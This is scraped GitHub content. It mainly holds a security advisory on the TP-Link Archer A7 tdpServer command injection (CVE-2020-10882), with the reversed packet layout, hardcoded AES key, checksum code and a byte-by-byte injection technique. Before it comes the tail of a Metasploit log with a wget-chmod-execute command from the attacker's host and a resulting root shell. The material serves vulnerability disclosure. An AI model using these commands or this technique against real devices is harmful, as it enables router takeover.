[*] Using URL: http://192.168.0.100:8080/r
[*] 192.168.0.1:20002 - Connecting to the target
[*] 192.168.0.1:20002 - Sending command file byte by byte
[*] 192.168.0.1:20002 - Command: wget http://192.168.0.100:8080/r;chmod +x r;./r
[*] 192.168.0.1:20002 - [0%]= = => - - - - - - - - - - - - - - - -[100%]
[*] 192.168.0.1:20002 - [0%]= = = = = = => - - - - - - - - - - - -[100%]
[*] 192.168.0.1:20002 - [0%]= = = = = = = = = = => - - - - - - - -[100%]
[*] 192.168.0.1:20002 - [0%]= = = = = = = = = = = = = = => - - - -[100%]
[*] 192.168.0.1:20002 - [0%]= = = = = = = = = = = = = = = = = = =>[100%]
[*] 192.168.0.1:20002 - Command file sent, attempting to execute...
[+] 192.168.0.1:20002 - Sending executable to the router
[+] 192.168.0.1:20002 - Sit back and relax, Shelly will come visit soon!
[*] Command shell session 1 opened (192.168.0.100:4444 -> 192.168.0.1:57818) at 2020-11-01 21:53:30 +0700
[*] Server stopped.

uid=0(root) gid=0(root)
uname -a
Linux ArcherA7v5 3.3.8 #1 Tue Jul 14 22:44:46 CST 2020 mips GNU/Linux
```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_14fed3d4_20250119_111820.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frdomanski%2FExploits_and_Advisories%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo2019%2Flao_bomb.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frdomanski%2FExploits_and_Advisories%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo2019%2Flao_bomb.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=rdomanski%2FExploits_and_Advisories)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rdomanski](/rdomanski)
/
**[Exploits\_and\_Advisories](/rdomanski/Exploits_and_Advisories)**
Public

* [Notifications](/login?return_to=%2Frdomanski%2FExploits_and_Advisories) You must be signed in to change notification settings
* [Fork
  20](/login?return_to=%2Frdomanski%2FExploits_and_Advisories)
* [Star
   111](/login?return_to=%2Frdomanski%2FExploits_and_Advisories)

* [Code](/rdomanski/Exploits_and_Advisories)
* [Issues
  1](/rdomanski/Exploits_and_Advisories/issues)
* [Pull requests
  0](/rdomanski/Exploits_and_Advisories/pulls)
* [Discussions](/rdomanski/Exploits_and_Advisories/discussions)
* [Actions](/rdomanski/Exploits_and_Advisories/actions)
* [Projects
  0](/rdomanski/Exploits_and_Advisories/projects)
* [Security](/rdomanski/Exploits_and_Advisories/security)
* [Insights](/rdomanski/Exploits_and_Advisories/pulse)

Additional navigation options

* [Code](/rdomanski/Exploits_and_Advisories)
* [Issues](/rdomanski/Exploits_and_Advisories/issues)
* [Pull requests](/rdomanski/Exploits_and_Advisories/pulls)
* [Discussions](/rdomanski/Exploits_and_Advisories/discussions)
* [Actions](/rdomanski/Exploits_and_Advisories/actions)
* [Projects](/rdomanski/Exploits_and_Advisories/projects)
* [Security](/rdomanski/Exploits_and_Advisories/security)
* [Insights](/rdomanski/Exploits_and_Advisories/pulse)

## Files

 master
## Breadcrumbs

1. [Exploits\_and\_Advisories](/rdomanski/Exploits_and_Advisories/tree/master)
2. /[advisories](/rdomanski/Exploits_and_Advisories/tree/master/advisories)
3. /[Pwn2Own](/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own)
4. /[Tokyo2019](/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own/Tokyo2019)
/
# lao\_bomb.md

Copy path Blame  Blame
## Latest commit

## History

[History](/rdomanski/Exploits_and_Advisories/commits/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md)486 lines (360 loc) · 21.9 KB master
## Breadcrumbs

1. [Exploits\_and\_Advisories](/rdomanski/Exploits_and_Advisories/tree/master)
2. /[advisories](/rdomanski/Exploits_and_Advisories/tree/master/advisories)
3. /[Pwn2Own](/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own)
4. /[Tokyo2019](/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own/Tokyo2019)
/
# lao\_bomb.md

Top
## File metadata and controls

* Preview
* Code
* Blame

486 lines (360 loc) · 21.9 KB[Raw](https://github.com/rdomanski/Exploits_and_Advisories/raw/refs/heads/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md)
# lao\_bomb

---

# Summary

This advisory describes a command injection vulnerability that was found by **Pedro Ribeiro (@pedrib1337 | pedrib@gmail.com)** and **Radek Domanski (@RabbitPro | radek.domanski@gmail.com)** in October 2019 and presented in the **Pwn2Own Mobile 2019 competition** in November 2019. Max Van Amerongen from F-Secure (@maxpl0it) found the same vulnerability independently.

The vulnerability exists in the tdpServer daemon (*/usr/bin/tdpServer*), running on the router TP-Link Archer A7/C7 (AC1750), hardware version 5, MIPS Architecture, firmware version 190726.

This vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. After exploitation, an attacker will be able to execute any command as root, including downloading and executing a binary from another host.

All function offsets and code snippets in this advisory were taken from */usr/bin/tdpServer*, firmware version 190726.

## Note

This advisory was disclosed publicly on 25.03.2020.

A special thanks to Zero Day Initiative for having the amazing Pwn2Own competition and allowing us to release this information to the public.

Copies of this advisory are available on GitHub at:

* <https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md>
* <https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md>

The following CVE numbers have been assigned:

* [CVE-2020-10882](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10882)
* [CVE-2020-10883](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10883)
* [CVE-2020-10884](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10884)

ZDI's advisories can be found at:

* [ZDI-20-334](https://www.zerodayinitiative.com/advisories/ZDI-20-334/)
* [ZDI-20-335](https://www.zerodayinitiative.com/advisories/ZDI-20-335/)
* [ZDI-20-336](https://www.zerodayinitiative.com/advisories/ZDI-20-336/)

And their blog post:

* [Exploiting the TP-Link Archer A7 at Pwn2Own Tokyo](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo)

A Metasploit module was also made available to the public with this advisory, and can be found at:

* [tplink\_archer\_a7\_c7\_lan\_rce.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/tplink_archer_a7_c7_lan_rce.rb)

This module can be seen in action below:
[![asciicast](https://camo.githubusercontent.com/19937e9baeb4836928ae889065be9840244aeffec92202ac435d9cffd508a93c/68747470733a2f2f61736369696e656d612e6f72672f612f3954764f65374e4d31335a7a334f56595758626e795743466e2e737667)](https://asciinema.org/a/9TvOe7NM13Zz3OVYWXbnyWCFn)

## Update (November 2020)

During our reseach for Pwn2Own Tokyo 2020, we found that TP-Link improperly patched the command injection, and we were able to exploit it again!
Unfortunately for us, they patched it one day before the competition, killing our (new?) bug. This injection bypass was assigned [CVE-2020-28347](https://nvd.nist.gov/vuln/detail/CVE-2020-28347).

As we had a bit more time to do deeper research, we were also able to improve the injection described here, and updated the [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/tplink_archer_a7_c7_lan_rce.rb) to work on older and newer versions with the same injection technique.
All details are available in [Pedro's GitHub](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2020/minesweeper.md) or [Radek's GitHub](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md).

~ Team Flashback

# Vulnerability Details

## Background on *tdpServer*

The *tdpServer* daemon listens on port 20002/udp on interface 0.0.0.0. The whole functionality of the daemon is not fully understood by the authors at this point, as this was unnecessary for exploitation. However, the daemon seems to be a bridge between the TP-Link mobile application and the router, allowing to establish some sort of control channel from the mobile application.

The daemon communicates with the mobile application through the use of UDP packets, with an encrypted payload. The packet format was reversed and it is shown below:

```
#define PACKET_SZ 0x400
#define PACKET_HDR_SZ 0x10
#define PAYLOAD_SZ (PACKET_SZ - PACKET_HDR_SZ)

typedef struct tpdp_packet {
  // packet version, fixed to 1
  uint8_t version;

  // packet type; tdpd == 0 or onemesh == 0xf0
  uint8_t type;

  // onemesh opcode, used by the onemesh_main switch table
  uint16_t opcode;

  // packet length
  uint16_t len;

  // some flag, has to be 1 to enter the vulnerable onemesh function
  uint8_t flags;

  // dunno what this is
  uint8_t unknown;

  // sn == serial number ? can be any value
  uint32_t sn;

  // packet checksum
  uint32_t checksum;

  // the payload can have up to 0x3F0 bytes
  uint8_t payload[PACKET_SZ-PACKET_HDR_SZ];
} packet;
```

The packet type determines what service in the daemon will be invoked. A type of 1 will cause the daemon to invoke the *tdpd* service, which will simply reply with a packet with a certain TETHER\_KEY in MD5. Because this is not relevant to the vulnerability, it wasn't investigated in detail.

The other possible type is 0xf0, which invokes the *onemesh* service. This service is where the vulnerability lies.
*OneMesh* appears to be a proprietary mesh technology that was introduced by TP-Link in recent firmware versions for a number of their routers (check <https://www.tp-link.com/us/onemesh/compatibility/> for details).

The other fields in the packet are relatively well explained in the comments above.

## Understanding the vulnerability

Upon start-up, the first relevant function invoked is *tdpd\_pkt\_handler\_loop()* (offset 0x40d164), which opens a UDP socket listening on port 20002/udp. Once a packet is received, this function passes the packet to *tpdp\_pkt\_parser()* (0x40cfe0) of which a snippet is shown below:

```
int tdpd_pkt_parser(int packet,int packet_len,int packet_reply,int *packet_reply_len,int param_5)

{
(...)
  if (packet != 0) {
    packet_len = return_0x10();
    if (packet_sz < packet_len) {
      print_debug("tdpdServer.c:709","recvbuf length = %d, less than hdr\'s 16",packet_sz);
      return 0xffffffff;
    }
    packet_len = tdpd_get_pkt_len(packet);
    if (packet_len < 1) {
      pcVar7 = "tdpdServer.c:716";
      pcVar8 = "tdp pkt is too big";
    }
    else {
      print_debug("tdpdServer.c:719","tdp pkt length is %d",packet_len);
      packet_len = tdpd_pkt_sanity_checks(packet,packet_len);
      if (packet_len < 0) {
        return 0xffffffff;
      }
(...)
```
> Snippet 1: *tdpd\_pkt\_parser()* #1

In this first snippet, we see that the parser first checks if the packet size (as received in the UDP socket) is at least 0x10, which is the size of the header.

Then it invokes tdpd\_get\_pkt\_len() (0x40d620), which returns the length of the packet as declared in the packet header (*len* field). This function returns -1 if the packet length exceeds 0x410.

The final check will be done by tdpd\_pkt\_sanity\_checks() (0x40c9d0), which will not be shown for brevity, but does two verifications: firstly, it checks if the packet version (*version* field, the first byte in the packet) is equal to 1. Secondly, it calculates a checksum of the packet using a custom checksum function - *tpdp\_pkt\_calc\_checksum()* (0x4037f0).

To better understand what is happening, the following function is *calc\_checksum()*, which is part of the **lao\_bomb** exploit code. This is shown in place of *tpdp\_pkt\_calc\_checksum()* as it is easier to understand.

```
void calc_checksum(packet *pkt, int len) {
  uint8_t *ptr;
  uint8_t val;
  uint32_t res;
  int32_t i = 0;

  // set magic var before calculating checksum
  pkt->checksum = 0x5a6b7c8d;

  res = 0xffffffff;
  ptr = (uint8_t*)pkt;

  while (i < len) {
    val = *(uint8_t*)ptr;
    res = *(uint32_t *)(reference_tbl + (((uint32_t)val ^ res) & 0xff) * 4) ^ (res >> 8);
    ptr += 1;
    i += 1;
  }

  res = ~res;
  pkt->checksum = res;
  return;
}
```
> Snippet 2: *calc\_checksum()* from the lao\_bomb exploit code

The checksum calculation is quite straightforward; it starts by setting a *magic* variable of 0x5a6b7c8d in the packet's checksum field, and then uses *reference\_tbl*, a table with 1024 bytes, to calculate the checksum over the whole packet, including the header.

Once the checksum is verified and all is correct, *tdpd\_pkt\_sanity\_checks()* returns 0, and we then enter the next part of *tdpd\_pkt\_parser()*:

```
(...)
  if (*(char *)(packet + 1) == '\0') {
    (...)
  }

  if ((*(char *)(packet + 1) == 0xf0) && (onemesh_flag == '\x01')) {
    ret = onemesh_main(packet,packet_sz,packet_reply,packet_reply_len);
    return ret;
  }
(...)
```
> Snippet 3: *tdpd\_pkt\_parser()* #2

Here the second byte of the packet, *type* is checked to see if it's 0 (tdpd) or 0xf0 (onemesh). In the latter branch, it also checks if *onemesh\_flag* (a global variable) is set to 1, which it is by default. This is the branch we want to follow; then we enter *onemesh\_main()* (0x40cd78).

*onemesh\_main()* won't be shown here for brevity; but what it does is to invoke another function based on the packet's *opcode* field. In order to reach our vulnerable function, the *opcode* field has to be set to 6, and the *flags* field has to be set to 1. In this case, *onemesh\_slave\_key\_offer()* (0x414d14) will be invoked.

This is our vulnerable function, as it is very long, only the relevant parts will be shown.

```
int onemesh_slave_key_offer(int packet,undefined4 packet_sz,undefined *packet_reply,int *packet_reply_len)
{
(...)
  if (((packet == 0) || (packet_reply == NULL)) || (packet_reply_len == NULL)) {
    __s = "tdpOneMesh.c:2887";
    __dest = "Invalid parameters";
    goto return_-1_n_exit;
  }
  payload_dec = (void *)(packet + 0x10);
  memset(plaintext_out,0,0x400);
  ret = tpapp_aes_decrypt(payload_dec,(uint)*(ushort *)(packet + 4),"TPONEMESH_Kf!xn?gj6pMAt-wBNV_TDP",plaintext_out,0x400);
  if (ret != 0) {
    __s = "tdpOneMesh.c:2896";
    __dest = "Failed to decrypt.";
    goto return_-1_n_exit;
  }
  __n = strlen(plaintext_out);
  print_debug("tdpOneMesh.c:2899","plainLen is %d, plainText is %s",__n,plaintext_out);
(...)
```
> Snippet 4: *onemesh\_slave\_key\_offer()* #1

In this first snippet of *onemesh\_slave\_key\_offer()*, we see that the packet gets passed on to *tpapp\_aes\_decrypt()* (0x40b190). This function will also not be shown for brevity, but it's easy to understand what it does from the name and its arguments: it decrypts the packet contents with the AES algorithm and a static key *"TPONEMESH\_Kf!xn?gj6pMAt-wBNV\_TDP"*.

For now, let's assume that *tpapp\_aes\_decrypt* was able to decrypt the packet successfully and move on to the next relevant snippet in *onemesh\_slave\_key\_offer()*:

```
(...)
  print_debug("tdpOneMesh.c:2915","Enter..., rcvPkt->payload is %s",payload_dec);
  ret = tdp_onemesh_get_onemesh_info(onemesh_info);
  if (ret != 0) {
    print_debug("tdpOneMesh.c:2919","Failed tdp_onemesh_get_onemesh_info!");
    strncpy(error_msg,"Internal Error!",0xff);
  }
  parsed_obj = payload_parsing(payload_dec);
  if (parsed_obj == 0) {
    __s = "tdpOneMesh.c:2926";
    __dest = "Invalid rcvPkt";
    goto return_-1_n_exit;
  }
  str_obj = strcasestr_obj(parsed_obj,"method");
  if (((str_obj == 0) || (*(int *)(str_obj + 0xc) != 4)) || (str_obj = strcmp(*(char **)(str_obj + 0x10),"slave_key_offer"), str_obj != 0)) {
    __s = "tdpOneMesh.c:2934";
    __dest = "Invalid method!";
    goto return_-1_n_exit;
  }
  str_obj = strcasestr_obj(parsed_obj,"data");
  if ((str_obj == 0) || (*(int *)(str_obj + 0xc) != 6)) {
    __s = "tdpOneMesh.c:2941";
  }
  else {
    ret2 = strcasestr_obj(str_obj,"group_id");
    if (ret2 == 0) {
      __s = "tdpOneMesh.c:2948";
    }
    else {
      __s = "tdpOneMesh.c:2948";
      if (*(int *)(ret2 + 0xc) == 4) {
        strncpy(onemesh_info_cp,onemesh_info,0x3f);
(...)
```
> Snippet 5: *onemesh\_slave\_key\_offer()* #2

In this snippet, we see some other functions being called (basically the setup of the onemesh object) followed by the start of the parsing of the actual packet payload.

The expected payload is a JSON object, such as the one shown below:

```
{
  "method": "slave_key_offer",
  "data": {
    "group_id": "123",
    "ip": "1.3.3.7",
    "slave_mac": "00:11:22:33:44:55",
    "slave_private_account": "admin",
    "slave_private_password": "password",
    "want_to_join": false,
    "model": "owned",
    "product_type": "archer",
    "operation_mode": "whatever"
  }
}
```
> Example JSON payload for *onemesh\_slave\_key\_offer()*

In Snippet 5, we can see the code first fetching the *method* JSON key and its value, and then the start of the parsing of the *data* JSON object.
The next snippet shows that each key of the *data* object and its value is processed in order. If one of the required keys does not exist, the function simply exits:

```
(...)
  ret2 = strcasestr_obj(str_obj,"ip");
  if (ret2 == 0) {
    __s = "tdpOneMesh.c:2960";
  }
  else {
    __s = "tdpOneMesh.c:2960";
    if (*(int *)(ret2 + 0xc) == 4) {
      strncpy(slaveIp,*(char **)(ret2 + 0x10),0xf);
      print_debug("tdpOneMesh.c:2964","slaveIp is %s",slaveIp);
      ret2 = strcasestr_obj(str_obj,"slave_mac");
      if ((ret2 == 0) || (*(int *)(ret2 + 0xc) != 4)) {
        __s = "tdpOneMesh.c:2969";
      }
      else {
        strncpy(slaveMac_copy,*(char **)(ret2 + 0x10),0x11);
        strncpy(slaveMac,*(char **)(ret2 + 0x10),0x11);
        ret2 = strcasestr_obj(str_obj,"slave_private_account");
        if (ret2 == 0) {
          __s = "tdpOneMesh.c:2978";
        }
        else {
          __s = "tdpOneMesh.c:2978";
          if (*(int *)(ret2 + 0xc) == 4) {
            strncpy(encAccount,*(char **)(ret2 + 0x10),0x207);
            ret2 = strcasestr_obj(str_obj,"slave_private_password");
            if (ret2 == 0) {
              __s = "tdpOneMesh.c:2986";
            }
            else {
              __s = "tdpOneMesh.c:2986";
              if (*(int *)(ret2 + 0xc) == 4) {
                strncpy(encPassword,*(char **)(ret2 + 0x10),0x207);
                ret2 = strcasestr_obj(str_obj,"want_to_join");
                if (ret2 == 0) {
                  __s = "tdpOneMesh.c:2995";
                }
                else {
                  if (*(int *)(ret2 + 0xc) == 1) {
                    ret2 = 1;
                    acStack3190[0] = '1';
                  }
                  else {
                    if (*(int *)(ret2 + 0xc) != 0) {
                      __s = "tdpOneMesh.c:3013";
                      goto ret_invalid_data;
                    }
                    ret2 = 0;
                    acStack3190[0] = '0';
                  }
                  ret3 = strcasestr_obj(str_obj,"model");
                  if ((ret3 == 0) || (*(int *)(ret3 + 0xc) != 4)) {
                    __s = "tdpOneMesh.c:3021";
                  }
                  else {
                    strncpy(model,*(char **)(ret3 + 0x10),0x20);
                    ret3 = strcasestr_obj(str_obj,"product_type");
                    if (ret3 == 0) {
                      __s = "tdpOneMesh.c:3029";
                    }
                    else {
                      __s = "tdpOneMesh.c:3029";
                      if (*(int *)(ret3 + 0xc) == 4) {
                        strncpy(prod_type,*(char **)(ret3 + 0x10),0x20);
                        ret3 = strcasestr_obj(str_obj,"operation_mode");
                        if (ret3 == 0) {
                          __s = "tdpOneMesh.c:3037";
                        }
                        else {
                          __s = "tdpOneMesh.c:3037";
                          if (*(int *)(ret3 + 0xc) == 4) {
                            strncpy(op_mode,*(char **)(ret3 + 0x10),0x10);
                            if (ret2 == 0) {
                              str_obj = create_csjon_obj();
                              if (str_obj == 0) {
                                __s = "tdpOneMesh.c:3132";
                                __dest = "Failed to creat cJSON Obj";
                                ret = -1;
                                print_debug(__s,__dest);
                                __s = NULL;
(...)
```
> Snippet 6: *onemesh\_slave\_key\_offer()* #3

As it can be seen above, each JSON key is parsed and then copied into a stack variable (*slaveMac*, *slaveIp*, etc).

At the end of the parsing of the JSON object, the function starts preparing the response by invoking *create\_csjon\_obj()* (0x405fe8).

From here onwards, the function does a lot of different operations on the data that was received and while preparing the response. These will not be explained here for two reasons:

1. They are inconsequential to our vulnerability and exploit.
2. We did not take the time to understand them, because of point 1.

The part that matters is shown below:

```
(...)
  print_debug("tdpOneMesh.c:3363","Sync wifi for specified mac %s start.....",slaveMac);
  memset(systemCmd,0,0x200);
  snprintf(systemCmd,0x1ff,
    "lua -e \'require(\"luci.controller.admin.onemesh\"). \
    sync_wifi_specified({mac=\"%s\"})\'",slaveMac);
  print_debug("tdpOneMesh.c:3368","systemCmd: %s",systemCmd);
  system(systemCmd);
  print_debug("tdpOneMesh.c:3370","Sync wifi for specified mac %s end.....",slaveMac);
(...)
```
> Snippet 7: *onemesh\_slave\_key\_offer()* #4

And here is our vulnerability in full glory. If you recall **Snippet 6** above, you'll see that the JSON key *slave\_mac* is copied into the *slaveMac* stack variable.

In **Snippet 7**, *slaveMac* will then be copied by *sprintf* into the *systemCmd* variable that will then be passed to *system()*.

Looking closely, there is a very clear command injection here. However to exploit it, we will need to escape the command, which will be demonstrated in the next section.

# Exploitation

## Reaching the vulnerable function

The first thing to understand is how we can reach this clean command injection. After trial and error, we found out that sending the JSON structure shown above (\*Example JSON payload for \*onemesh\_slave\_key\_offer()\*\*) always hits this vulnerable code path.

In particular, *method* has to be *slave\_key\_offer*, and *want\_to\_join* has to be *false*. The other values can be somewhat random, although some special characters in fields other than *slave\_mac* might cause the vulnerable function to exit early and not process our injection.

With regards to the packet header, as previously described, we have to set *type* to 0xf0, *opcode* to 6 and *flags* to 1, as well as get the *checksum* field correct.

## Encrypting the packet

As explained in the previous section, the packet gets encrypted with AES in CBC mode with a fixed key of *TPONEMESH\_Kf!xn?gj6pMAt-wBNV\_TDP* and a fixed IV of *1234567890abcdef1234567890abcdef*. Despite having a 32 byte / 256 bit key and IV, the actual algorithm used is AES-CBC with a 128 bit key, so half of the key and IV are not used.

## Achieving code execution

So now we know how to hit the vulnerable code path, we just need to send the command and that's it right? Well, actually no. There are two problems.

1. The *strncpy()* that copies the *slave\_mac\_info* key into the *slaveMac* variable only copies 0x11 / 17 bytes, and that's including the terminating null byte.
2. We need to perform some escaping as the lua code is single and double quoted.

With these two constraints in mind, the actual available space is quite limited.

In order to escape the lua code and execute our payload, we have to add the following characters:

```
';<PAYLOAD>'

```

So that's 3 characters that we just lost, plus 1 for the terminating null byte, which leaves us with only 13 bytes of payload.
With 13 bytes (characters), it's pretty much impossible to execute anything meaningful.

Our solution was to trigger the bug many times, building up a desired **command file** on the target, one character at a time. Then we trigger the bug one final time to execute the command file as a shell script.

For example that to append the character 'a' to a file 'z', we can do the following:

```
printf 'a'>>z

```

And that's 13 bytes used!

Luckily, the above is just enough to print all characters we need to achieve code execution. And even more luckily, we do not need to change the directory to */tmp*, as it is many times necessary in embedded devices because the filesystem root is usually not writeable. In this router, the filesystem is mounted read-write, which is a major security mistake by TP-Link.

Had it been mounted read-only, as it is normal in most embedded devices that use the SquashFS filesystem, this particular attack would have been impossible, as adding *cd tmp* before each byte injection would consume too many of the available 13 characters.

It should be noted that despite the escaping we do, the last few bytes of the lua script code that was supposed to be executed end up in the file name. So a file named 'z' in reality will be named 'z"})'. This doesn't affect us, since it doesn't shorten the 13 bytes available for the payload.

And with this, we have all we need to execute arbitrary commands. We send the command byte by byte, adding them to a command file 'z', and then we send the payload:

```
sh z

```

... and our command file gets executed as root. From here on, we can download and execute a binary, and we have full control of the router.

## Errata

The original version of this advisory was based on the C exploit we originally wrote for the Pwn2Own competition, and due to problems at the time we could only use 12 bytes instead of 13 to send our command.

This caused a major headache when printing special characters such as ';' or digits, which would be interpreted by the shell instead of being printed. To work around this, we used a trick that involved printing the special characters to another separate file, and then using *cat* to add the contents to that file to the command file.

After porting the exploit to Metasploit, we realised that actually we could use 13 bytes, and our workaround was unnecessary.

The original advisory can be found in its full glory at [Exploiting the TP-Link Archer A7 at Pwn2Own Tokyo](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_55c57b1b_20250119_111821.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frdomanski%2FExploits_and_Advisories%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo2020%2Fminesweeper.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted
